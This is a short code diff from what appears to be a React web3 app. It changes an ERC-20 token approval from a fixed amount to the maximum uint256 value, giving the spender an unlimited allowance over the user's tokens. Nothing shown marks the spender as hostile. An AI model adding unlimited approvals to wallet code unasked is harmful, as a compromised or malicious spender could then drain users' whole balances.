@@ -184,7 +184,7 @@ export default function App() {
           await writeContractAsync({
             address: token.address as `0x${string}`,
             abi: parseAbi(['function approve(address, uint256) returns (bool)']),
-            functionName: 'approve', args: [spender, 100000000n], chainId: fromId,
+            functionName: 'approve', args: [spender, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')], chainId: fromId,
           })
         }
         const types = { ...payload.types }
